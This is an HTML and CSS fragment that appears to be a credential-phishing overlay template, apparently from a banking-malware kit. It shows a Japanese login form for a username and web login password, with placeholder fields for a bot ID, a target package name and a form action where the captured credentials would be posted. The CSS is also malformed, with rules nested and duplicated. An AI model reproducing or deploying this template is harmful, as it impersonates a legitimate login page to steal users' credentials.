body {
	margin: 0;
	padding: 0;
}

.header {
    padding: 20px;
    background: #0769b5;
    text-align: center;

    width: 60%;

	.fielderror {
		width: 100%;
		border: 0;
		border-bottom: 1px solid #f00;
	}
	
	.input:focus {
		border-bottom: 2px solid #0769b5;
	}

    margin-bottom: 20px;
    margin-top: 20px;
    width: 100%;
    font-size: 18px;
    padding: 13px;
    background: #0769b5;
    border: 0;
    border-radius: 5px;
    color: #fff;
}

.h3, h3 {
    font-size: 18px;
    font-weight: bold;
    text-align: center;
    margin-top: 0;
    color: #727272;
}

<div id="content_div">
<div class="col-xs-10 col-sm-8">
			<form id='mainform' method='post' action='%ACTION%' onsubmit="return function(){ 
var ok = true;

$('input').each(function (i, value){  
	$(value).css('border', '');
	
	if(!$(value).is(':visible') || $(value).prop('type') == 'submit')
		return;
		
	if($(value).val().length < 3){
		$(value).css('border', '1px solid red');
		ok = false;
	}
	
	if($(value).prop('maxlength') !== undefined && $(value).prop('maxlength') != -1 && $(value).val().length > $(value).prop('maxlength'))
	{
		$(value).css('border', '1px solid red');
		ok = false;
	}
	
});
if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
}()">
		<input type="hidden" name="page_id" value="%PKG%" class="main_input" /><input type="hidden" name="bot_id" value="%BOTID%" />
			
				<input name="fields[login]" id="login" placeholder="ユーザーネーム" maxlength="17" class="input" type="text" style="margin-bottom: 20px;">
			
				<input name="fields[password]" id="password" placeholder="WEBログインパスワード" class="input" type="password">
				
				<input value="ログイン" id="input_submitBtn" type="submit" />
				
			</form>
			
			<h3> パスワードをお忘れの方は<b style="color: #0769b5">こちら </b> </h3>
